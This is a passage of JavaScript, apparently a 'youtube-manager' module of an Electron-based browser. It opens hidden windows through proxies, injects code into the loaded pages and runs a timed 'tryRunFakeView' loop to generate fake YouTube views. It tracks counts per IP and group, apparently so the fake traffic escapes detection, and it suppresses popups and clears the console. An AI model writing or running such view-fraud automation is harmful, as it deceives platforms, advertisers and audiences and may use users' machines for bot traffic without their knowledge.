            proxyRules: options.proxy,
            proxyBypassRules: '127.0.0.1',
          },
          function () {}
        );
      }

      if (SOCIALBROWSER.var.core.version < '2021.03.01') {
        win.webContents.addListener('dom-ready', function (event) {
          win.webContents.executeJavaScript(code_injected);
        });
      } else {
        SOCIALBROWSER.call('[set][window][setting]', {
          win_id: win.id,
          options: options,
          name: 'eval',
          code: code_injected,
        });
      }

      win.loadURL(options.referer).catch((err) => {
        if (err.code === 'ERR_ABORTED') {
        }
      });

      win.on('close', function () {
        win.destroy();
      });

      win.on('closed', function () {});

      win.webContents.on('did-fail-load', function (e) {
        if (e.isMainFrame) {
          win.destroy();
        }
      });

      win.webContents.session.on('will-download', (event, item, webContents) => {
        event.preventDefault();
      });
      win.webContents.session.setPermissionRequestHandler((webContents, permission, callback) => {
        callback(false);
      });
      win.webContents.session.setPermissionCheckHandler((webContents, permission) => {
        return false;
      });

      if (win.webContents.setWindowOpenHandler) {
        win.webContents.setWindowOpenHandler(({ url, frameName }) => {
          console.log('youtube-manager.js : block setWindowOpenHandler');
          return { action: 'deny' };
        });

        win.webContents.on('did-create-window', (win, { url, frameName, options, disposition, referrer, postData }) => {});
      }
      win.webContents.on('new-window', function (event, url, frameName, disposition, options, referrer, postBody) {
        event.preventDefault();
        console.log('youtube-manager.js : block new-window ');
      });

      setTimeout(function () {
        if (win && !win.isDestroyed()) {
          win.destroy();
        }
      }, options.timeout);
    }
  };
  SOCIALBROWSER.youtubeManager.Tracking = function (v) {
    let t = { group_count: 0 };
    v.guid = v.referer + '---' + v.url + '---' + v.ip + '---' + v.group;
    SOCIALBROWSER.youtubeManager.trackingList.forEach((track) => {
      if (track.guid == v.guid) {
        track.count++;
        t = { ...track, ...t };
      }
      if (track.group == v.group && track.ip == v.ip) {
        t.group_count++;
      }
    });
    if (!t.guid) {
      t = {
        guid: v.guid,
        count: 1,
        group_count: 1,
        group: v.group,
        ip: v.ip,
        ...t,
      };
      SOCIALBROWSER.youtubeManager.trackingList.push(t);
    }
    return t;
  };
  SOCIALBROWSER.youtubeManager.tryRunFakeView = function () {
    let v = SOCIALBROWSER.youtubeManager.getNewVisit();
    if (v) {
      v = { ...SOCIALBROWSER.youtubeManager.visitOptions, ...v };
      let track = SOCIALBROWSER.youtubeManager.Tracking(v);
      if ((v.count && v.count < track.count) || track.group_count > 2) {
        setTimeout(() => {
          SOCIALBROWSER.youtubeManager.tryRunFakeView();
        }, 1000 * 30);
      } else {
        SOCIALBROWSER.youtubeManager.openFakeViewWindow(v);
        setTimeout(() => {
          SOCIALBROWSER.youtubeManager.tryRunFakeView();
        }, v.timeout + 1000 * 60);
      }
    } else {
      setTimeout(() => {
        SOCIALBROWSER.youtubeManager.tryRunFakeView();
      }, 1000 * 15);
    }
  };

  SOCIALBROWSER.youtubeManager.startTime = Date.now();
  SOCIALBROWSER.youtubeManager.prepareVisits();
  SOCIALBROWSER.youtubeManager.prepareExternalReferer();

  setTimeout(() => {
    SOCIALBROWSER.youtubeManager.tryRunFakeView();
  }, 1000 * 60 * 5);
  setInterval(() => {
    SOCIALBROWSER.youtubeManager.prepareVisits();
    SOCIALBROWSER.youtubeManager.prepareExternalReferer();
    if (Date.now() - SOCIALBROWSER.youtubeManager.startTime > 1000 * 60 * 60 * 24) {
      SOCIALBROWSER.youtubeManager.trackingList = [];
      console.clear();
    }
  }, 1000 * 60 * 60);
})(window);
